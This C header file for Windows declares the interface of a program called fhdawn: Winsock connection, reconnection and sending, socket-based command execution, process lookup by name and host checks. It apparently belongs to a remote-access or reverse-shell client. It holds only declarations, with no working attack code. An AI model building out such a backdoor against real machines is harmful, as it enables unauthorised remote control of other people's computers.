#ifndef __FHDAWN__H__
#define __FHDAWN__H__
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
/*
Author: Fahad (QuantumCore)
fhdawn.h (c) 2020
Desc: Main header file 
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <iphlpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")

#define BUFFER 1024
#define WIN32_LEAN_AND_MEAN

static BOOL connected = FALSE;

struct sockaddr_in server;
SOCKET sockfd;
char recvbuf[BUFFER];
//=====================
void ReportError(void);
void WSAReportError(void);

//=====================
void sockprintf(SOCKET sock, const char* words, ...);

// Start Winsock
void StartWSA(void);
void fhdawn_main(void);
void MainConnect(void);
void sockSend(const char* data);

DWORD ProcessId(LPCTSTR ProcessName);
void ExecSock(void);
void CheckHost(const char* ip_address);
const char* IP2Host(const char* IP);
void split(char* src, char* dest[5], const char* delimeter);
void REConnect();

#endif  //!__FHDAWN__H__